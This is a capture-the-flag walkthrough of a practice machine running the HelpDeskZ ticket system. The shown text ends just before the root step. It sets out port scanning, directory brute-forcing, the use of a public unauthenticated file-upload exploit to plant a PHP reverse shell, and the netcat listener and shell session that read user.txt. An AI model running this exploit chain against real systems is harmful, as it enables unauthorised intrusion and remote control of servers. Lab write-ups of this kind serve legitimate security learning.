We first start with scanning the ports. Nmap reveals that we have 3 open ports: 22, 80 and 3000. 
Trying to access port 3000 reveals by headers that it's a web application powered by express. I don't have expirience with it, therefore I decided to check port 80 first. Performing a deeper scan with nmap reveals its a web server powered by httpd. Straight away I checked for vulnerabilities for this version - only to find there are no sugnificant ones. 

I decided to run dirbuster in order to pick some interesting paths in the webserver (I used the medium wordlist provided by the tool):
```
root@kali:~# dirbuster 
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /support/ - 200
Mar 17, 2019 11:57:36 AM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: StartTag a at (r23,c41,p1022) rejected because of '<' character at position (r23,c87,p1068)
Mar 17, 2019 11:57:37 AM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: Encountered possible StartTag at (r23,c41,p1022) whose content does not match a registered StartTagType
Dir found: /support/images/ - 200
Dir found: /icons/ - 403
File found: /support - 301
Dir found: /support/js/ - 302
File found: /support/images/index.php - 200
File found: /support/js/index.php - 302
Dir found: /support/uploads/ - 302
File found: /support/uploads/index.php - 302
Dir found: /support/uploads/articles/ - 302
File found: /support/uploads/articles/index.php - 302
Dir found: /support/css/ - 200
File found: /support/css/index.php - 200
Dir found: /support/includes/ - 302
File found: /support/includes/index.php - 302
```
Looking at /support reveals a ticket system called helpdeskz - searching via searchsploit reveals we have a remote file upload exploit: https://www.exploit-db.com/exploits/40300

Okay, it seems that the programmer of the system didn't think much about the security of the upload function. Our plan will be as follows:
1. upload a php shell to the server
2. access that shell, thus activating it
3. gaining the user.txt
4. gaining the root.txt

We are going to exploit the function by guessing the time the file was uploaded (therefore, because the function ranges only between 0-300, we want to do it asap). The programmer hashed it with time as salt.

I used the first reverse shell I found in the internet and set my ip address in the internal vpn network as the target ip:
http://pentestmonkey.net/tools/web-shells/php-reverse-shell

then, when I tried to upload the file - I received the following error: `'We encountered a problem (cross-site request forgery detected); please try again.`
Going through the original code (which is located at https://github.com/evolutionscript/HelpDeskZ-1.0/) revealed that after 600 seconds the token is not valid anymore, therefore I need to upload the file faster. After doing that - I received a different error: **"FIle not allowed"**. This error got me stuck for hours. I found a couple of interesting function - verifyAttachment and verifyToken. However, it didn't make sense because .php files are supported in the system (in install.php) and the file is okay. Obviously uploading a different extension will give us nothing, we need that .php extension for the shell to work. I'm not familiar with php, so I began searching for the function the **actually** uploads the files. It seems that move_uploaded_files is the one we need. We can actually see that the programmer made it easy for us - the function is being called before the verifyAttachment() function, thus our file is actually in the server! it's in /support/uploads/tickets/

Couldn't believe I have spend hours on this one, while all the time it was infront of me. Anyway, reading the exploit we want to specify the name of the file and the basename. Before that, let's setup our reverse shell listener:
```
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
```
Now we run the script and we can see that our shell becomes alive:
```
root@kali:~# python exploit.py http://10.10.10.121/support/uploads/tickets/ reverse_shell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
```
On other tab:
```
connect to [10.10.13.78] from (UNKNOWN) [10.10.10.121] 50894
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 07:56:49 up 6 min,  0 users,  load average: 0.29, 0.26, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sam)
/bin/sh: 0: can't access tty; job control turned off
$ whomai
/bin/sh: 1: whomai: not found
$ dir
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
$ cd ^?^?^?
/bin/sh: 3: cd: can't cd to 
$ cd home
$ ls
help
$ cat help
cat: help: Is a directory
$ cd help
$ ls
help
npm-debug.log
user.txt
$ cat user.txt
_hidden_
```
Now let's get our root:

